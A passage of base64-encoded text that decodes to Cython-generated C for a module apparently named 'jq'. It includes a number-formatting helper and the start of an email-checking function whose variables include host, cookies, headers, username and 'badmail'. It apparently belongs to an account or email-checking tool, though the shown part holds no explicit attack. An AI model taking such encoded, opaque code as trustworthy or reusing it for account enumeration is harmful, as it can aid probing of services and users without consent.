aWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzNTAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRlbWFpbCwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM1MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzEwID0gTlVMTDtcbiAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzE0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHBwcCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAzNTEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7XG4gICAgICAgIF9fcHl4X3RfMTMgPSAxO1xuICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzE0KSkpIHtcbiAgICAgICAgICBfX3B5eF90XzEwID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xNCk7XG4gICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMTApO1xuICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xNCk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xNCwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgfVxuICAgICAgICAjZW5kaWZcbiAgICAgICAge1xuICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEwLCBOVUxMfTtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzE0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMS1fX3B5eF90XzEzKSB8IChfX3B5eF90XzEzKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzUxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIH1cbiAgICAgIF9fcHl4X0wyMDo7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBnb3RvIF9fcHl4X0w4X3RyeV9lbmQ7XG4gICAgX19weXhfTDNfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG5cbiAgICBcbiAgICAge1xuICAgICAgX19QeXhfRXJyUmVzdG9yZSgwLDAsMCk7XG4gICAgICBnb3RvIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgIH1cbiAgICBfX3B5eF9MNF9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7XG4gICAgX19weXhfTDhfdHJ5X2VuZDo7XG4gIH1cblxuICBcblxuICBcbiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X28pO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdGwpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaG9zdCk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9jb29raWVzKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcGFyYW1zKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RhdGEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzcG9uc2UpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3Zfb2spO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdXNlcm5hbWUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZ2cpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZW1haWwpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJqcV8xM2Zvcm1hdF9udW1iZXIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMmpxXzEzZm9ybWF0X251bWJlciA9IHsiZm9ybWF0X251bWJlciIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMmpxXzEzZm9ybWF0X251bWJlciwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmpxXzEzZm9ybWF0X251bWJlcihQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3ZhbHVlID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMV0gPSB7MH07XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZm9ybWF0X251bWJlciAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdmFsdWUsMH07XG4gICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAzNTYsIF9fcHl4X0wzX2Vycm9yKVxuICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHtcbiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAzNTYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJmb3JtYXRfbnVtYmVyIiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNTYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDE7IGkrKykge1xuICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImZvcm1hdF9udW1iZXIiLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDM1NiwgX19weXhfTDNfZXJyb3IpIH1cbiAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDEpKSB7XG4gICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgIH0gZWxzZSB7XG4gICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAzNTYsIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X3ZhbHVlID0gdmFsdWVzWzBdO1xuICB9XG4gIGdvdG8gX19weXhfTDZfc2tpcDtcbiAgX19weXhfTDVfYXJndHVwbGVfZXJyb3I6O1xuICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiZm9ybWF0X251bWJlciIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDM1NiwgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcS5mb3JtYXRfbnVtYmVyIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gTlVMTDtcbiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6O1xuICBfX3B5eF9yID0gX19weXhfcGZfMmpxXzEyZm9ybWF0X251bWJlcihfX3B5eF9zZWxmLCBfX3B5eF92X3ZhbHVlKTtcblxuICBcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMmpxXzEyZm9ybWF0X251bWJlcihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl92YWx1ZSkge1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMO1xuICBpbnQgX19weXhfdF8yO1xuICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZm9ybWF0X251bWJlciIsIDApO1xuICBfX1B5eF9JTkNSRUYoX19weXhfdl92YWx1ZSk7XG5cbiAgXG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5TnVtYmVyX0Zsb2F0KF9fcHl4X3ZfdmFsdWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNTcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfREVDUkVGX1NFVChfX3B5eF92X3ZhbHVlLCBfX3B5eF90XzEpO1xuICBfX3B5eF90XzEgPSAwO1xuXG4gIFxuICBfX3B5eF90XzEgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3ZhbHVlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTAwMDAwMCwgUHlfR0UpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM1OCwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMiA8IDApKSkgX19QWVhfRVJSKDAsIDM1OCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBpZiAoX19weXhfdF8yKSB7XG5cbiAgICBcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhfX3B5eF92X3ZhbHVlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTAwMDAwMCwgMHhGNDI0MCwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM1OSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRm9ybWF0KF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xZik7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM1OSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM1OSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19weXhfciA9IF9fcHl4X3RfMTtcbiAgICBfX3B5eF90XzEgPSAwO1xuICAgIGdvdG8gX19weXhfTDA7XG5cbiAgICBcbiAgfVxuXG4gIFxuICBfX3B5eF90XzEgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3ZhbHVlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTAwMCwgUHlfR0UpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM2MCwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMiA8IDApKSkgX19QWVhfRVJSKDAsIDM2MCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBpZiAoX19weXhfdF8yKSB7XG5cbiAgICBcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhfX3B5eF92X3ZhbHVlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTAwMCwgMHgzRTgsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNjEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMWYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzNjEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2spOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNjEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fcHl4X3IgPSBfX3B5eF90XzE7XG4gICAgX19weXhfdF8xID0gMDtcbiAgICBnb3RvIF9fcHl4X0wwO1xuXG4gICAgXG4gIH1cblxuICBcbiAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTtcbiAgX19weXhfdF8xID0gX19QeXhfUHlOdW1iZXJfSW50KF9fcHl4X3ZfdmFsdWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNjIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzNjIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gIF9fcHl4X3IgPSBfX3B5eF90XzM7XG4gIF9fcHl4X3RfMyA9IDA7XG4gIGdvdG8gX19weXhfTDA7XG5cbiAgXG5cbiAgXG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygianEuZm9ybWF0X251bWJlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19weXhfTDA6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdmFsdWUpO1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJqcV8xNWNoZWNrX29uKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJqcV8xNWNoZWNrX29uID0geyJjaGVja19vbiIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMmpxXzE1Y2hlY2tfb24sIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJqcV8xNWNoZWNrX29uKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZW1haWwgPSAwO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJncztcbiAgI2VuZGlmXG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9rd3ZhbHVlcztcbiAgUHlPYmplY3QqIHZhbHVlc1sxXSA9IHswfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJjaGVja19vbiAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW1haWwsMH07XG4gICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAzNjUsIF9fcHl4X0wzX2Vycm9yKVxuICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHtcbiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQ